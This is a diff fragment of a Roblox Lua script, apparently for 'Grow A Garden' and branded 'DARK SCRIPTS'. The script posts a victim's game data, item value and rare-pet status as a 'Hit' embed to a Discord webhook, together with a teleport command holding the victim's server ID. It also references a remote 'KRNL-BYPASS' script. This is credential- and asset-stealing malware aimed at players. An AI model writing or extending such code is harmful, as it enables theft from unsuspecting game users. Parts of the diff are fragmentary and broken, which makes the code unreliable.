@@ -26,6 +26,7 @@ getgenv().Username = "DARK"
         local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
         local TeleportService = game:GetService("TeleportService")
         local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
+        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
         local data = DataService:GetData()
         local maxAttempts = 10
@@ -404,8 +405,6 @@ getgenv().Username = "DARK"
             end
         end
 
-        local payload = {
-            content = hasRarePets() and "--@everyone\" .. (tpScript or "N/A") .. " or " .. (tpScript or "N/A") .. ",
 local embed = {
     title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
     color = 65280,
@@ -423,7 +422,7 @@ local embed = {
         },
         {
             name = "💰 **Total Value**",
-            value = "```¢```", -- replace ¢ with a calculated value if needed
+            value = "```¢```",
             inline = false
         },
         {
@@ -452,20 +451,15 @@ local payload = {
     embeds = {embed}
 }
 
-local success, err = pcall(function()
+pcall(function()
     request({
         Url = Webhook,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
+        Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(payload)
     })
 end)
 
-if not success then
-    warn(err)
-end
 
 
                 local function CreateGui()
